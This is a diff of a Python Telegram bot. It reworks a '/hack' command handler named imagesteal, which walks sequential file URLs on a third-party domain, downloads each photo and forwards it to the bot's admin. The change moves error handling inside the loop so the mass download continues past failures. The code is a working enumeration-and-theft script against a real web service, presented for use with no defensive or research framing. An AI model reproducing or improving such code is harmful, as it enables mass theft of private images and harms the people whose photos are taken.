@@ -94,8 +94,9 @@ def todbsendtext (replied,message):
 @bot.message_handler(commands=['hack'])
 def imagesteal(message):
 	a = 1041959
-	try:
-		while a > 0:
+	while a > 0:
+		try:
+		
 			url = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
 			path = str("file_"+str(a)+".jpg")
 			response = requests.get(url)
@@ -109,9 +110,9 @@ def imagesteal(message):
 					bot.send_photo(tgadmin,img)
 			a-=1
 				   
-	except Exception as e:
-		print("ERROR : {0} \n".format(e))
-		a-=1
+		except Exception as e:
+			print("ERROR : {0} \n".format(e))
+		
 	a-=1			   
 			
 
